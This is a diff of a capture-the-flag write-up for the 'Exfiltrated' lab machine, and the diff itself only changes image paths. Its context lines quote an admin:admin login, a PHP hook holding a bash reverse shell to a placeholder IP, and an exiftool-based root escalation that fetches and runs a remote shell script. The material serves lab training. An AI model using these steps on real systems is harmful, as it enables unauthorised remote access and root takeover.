@@ -27,7 +27,7 @@ PORT   STATE SERVICE VERSION
 
 http://exfiltrated.offsec/
 
-![img](/assets/images/CTF/Pg-Play/Exfiltrated/admin-dashboard.png)
+![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/admin-dashboard.png)
 
 ### Admin Dashboard
 
@@ -37,7 +37,7 @@ http://exfiltrated.offsec/panel/
 
 admin:admin
 
-![img](/assets/images/CTF/Pg-Play/Exfiltrated/admin-dashboard2.png)
+![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/admin-dashboard2.png)
 
 Navigate to System->Hooks-> Edit sitemapGeneration
 
@@ -46,11 +46,11 @@ Add the below reverse shell code and click save.
 ```php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/1234 0>&1'");
 ```
-![img](/assets/images/CTF/Pg-Play/Exfiltrated/shell1.png)
+![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/shell1.png)
 
 Trigger shell by clicking the generate sitemap menu.
 
-![img](/assets/images/CTF/Pg-Play/Exfiltrated/shell2.png)
+![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/shell2.png)
 
 **Initial Foothold obtained**
 
@@ -141,13 +141,13 @@ cp exploit.djvu exploit.jpg
 
 Now curl to download the `exploit.jpg` file into the attacking machine's uploads folder `/var/www/html/subrion/uploads`.
 
-![img](/assets/images/CTF/Pg-Play/Exfiltrated/transfer.png)
+![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/transfer.png)
 
 Once the `exploit.jpg` is downloaded into the uploads folder the cronjob runs the script, and when the exiftool reads the metadata from the `exploit.jpg` file it executes the command we have binded in the image.
 
 Then it downloads the reverse shell script `shell.sh` from the attacker's machine and runs it as root.
 
-![img](/assets/images/CTF/Pg-Play/Exfiltrated/root.png)
+![img](/assets/images/CTF/Proving_Grounds/Exfiltrated/root.png)
 
 **Root Obtained**
 
